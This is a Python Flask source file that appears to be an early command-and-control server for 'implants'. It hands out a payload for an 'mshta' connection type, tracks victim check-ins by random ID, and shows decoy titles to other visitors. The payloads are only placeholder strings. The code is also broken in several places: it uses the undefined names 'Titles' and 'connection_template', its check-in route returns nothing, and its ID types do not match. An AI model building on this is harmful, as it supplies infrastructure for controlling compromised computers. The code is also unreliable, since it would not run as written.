import connect.color as color
import os
import random
import time

from flask import Flask, render_template

app = Flask(__name__)
connections = {}
titles = ['The connections you build over time.', 'Everything is connected.', 'Unlock the mind to connect to the universe of thought.']

class Connection():

    implant_data = ''

    def __init__(self):
        self.connection_id = connection_id()
        self.last_checkin = '0:0:0'
        self.original_checkin = Connection.get_current_time()
        self.status = 'Waiting'
        self.type = ''

    def __str__(self):
        return f'Original Checkin {self.original_checkin} || Last Checkin: {self.last_checkin} || Status: {self.status} || Type: {self.type}'

    def update_checkin(self):
        self.last_checkin = self.get_current_time()

    def return_implant(self):
        return self.implant_data

    @staticmethod
    def get_current_time():
        return time.strftime("%H:%M:%S", time.localtime())

    @staticmethod
    def mshta_connection():
        return 'yup pwned'

class MshtaConnection(Connection):

    implant_data = 'pwned brah'

    def __init__(self):
        super().__init__()
        self.type = 'mshta'

def connection_id():
    new_connection_id = [str(random.randint(0,9)) for random_integer in range (0,10)]
    new_connection_id = ''.join(new_connection_id)
    if new_connection_id in connections.keys():
        new_connection_id = connection_id()
    return new_connection_id

def display_connections():
    color.display_banner('Current Connections')
    if not connections.items():
        color.normal('No connections to display.\n')
        return 0
    for connection_id, connection in connections.items():
        if connection.status == 'Success':
            color.success(f'\tConnection ID: {connection_id} || {connection}')
        color.normal(f'Connection ID: {connection_id} || {connection}')
    color.normal('')
    return 0

@app.route('/<type>', methods=['GET'])
def serve_connection(type):
    connection_types = {'mshta':MshtaConnection()}
    if type not in connection_types.keys():
        return render_template(connection_template, title=Titles[random.randint(0,2)], data='')
    new_connection_id = connection_id()
    connections[new_connection_id] = connection_types[type]
    return connections[new_connection_id].return_implant()

@app.route('/connection/<int:connection_id>', methods=['POST'])
def new_connection(connection_id):
    #if connection_id not in connections.keys():
    #    abort(400, 'Not Found')
    connections[connection_id].update_checkin()

def run(ip, port):
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'
    app.run(host=ip, port=int(port))
